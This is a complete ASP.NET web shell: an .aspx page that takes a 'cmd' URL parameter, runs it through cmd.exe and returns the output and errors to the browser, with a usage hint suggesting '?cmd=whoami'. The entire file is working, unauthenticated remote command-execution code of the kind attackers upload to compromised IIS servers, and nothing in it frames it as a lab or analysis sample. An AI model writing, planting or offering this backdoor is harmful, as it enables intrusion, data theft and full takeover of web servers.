<%@ Page Language="C#" %>
    <% Response.ContentType="text/plain" ; string cmd=Request.QueryString["cmd"]; if (!string.IsNullOrEmpty(cmd)) {
        System.Diagnostics.ProcessStartInfo psi=new System.Diagnostics.ProcessStartInfo(); psi.FileName="cmd.exe" ;
        psi.Arguments="/c " + cmd; psi.RedirectStandardOutput=true; psi.RedirectStandardError=true;
        psi.UseShellExecute=false; psi.CreateNoWindow=true; System.Diagnostics.Process
        proc=System.Diagnostics.Process.Start(psi); string output=proc.StandardOutput.ReadToEnd(); string
        error=proc.StandardError.ReadToEnd(); proc.WaitForExit(); Response.Write(output); if
        (!string.IsNullOrEmpty(error)) { Response.Write("\n===ERROR===\n"); Response.Write(error); } } else {
        Response.Write("Usage: ?cmd=whoami"); } %>